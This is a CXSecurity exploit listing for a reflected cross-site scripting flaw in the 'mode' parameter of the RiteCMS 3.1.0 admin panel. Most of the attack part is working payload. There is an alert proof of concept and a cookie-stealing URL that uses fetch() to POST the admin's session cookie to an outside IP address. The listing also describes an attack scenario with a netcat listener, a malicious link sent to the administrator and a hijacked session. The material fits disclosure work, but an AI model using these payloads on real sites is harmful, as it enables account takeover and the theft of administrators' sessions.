---
title: RiteCMS 3.1.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2025100017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-10-29
fetch_date: 2025-10-30T03:10:20.669850
---

# RiteCMS 3.1.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **RiteCMS 3.1.0 Cross Site Scripting** **2025.10.29**  Credit:  **[Chokri Hammedi](https://cxsecurity.com/author/Chokri%2BHammedi/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Exploit Title: RiteCMS 3.1.0 - Reflected XSS in Admin Panel
## Date: October 28, 2025
## Exploit Author: Chokri Hammedi
## Vendor Homepage: https://ritecms.com/
## Software Link: https://github.com/ritecms/ritecms
## Version: RiteCMS 3.1.0
## Tested on: windows xp
## Vulnerability Description:
Reflected Cross-Site Scripting (XSS) vulnerability in the `mode` parameter
of the admin panel allows attackers to steal admin session cookies and
compromise the admin account.
## Proof of Concept:
### Alert Proof of Concept:
```http
http://ritecms.local/admin.php?mode=');alert('XSS');//
```
### Cookie Stealing Payload:
```http
http://ritecms.local/admin.php?mode=');fetch('http://192.168.1.103:8082/steal
',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:window.location.href})});//
```
## Attack Scenario:
1. Attacker sets up listener: `nc -lvnp 8082`
2. Attacker sends malicious link to admin
3. Admin clicks link, session cookie is sent to attacker
4. Attacker uses stolen session to gain admin access

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025100017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top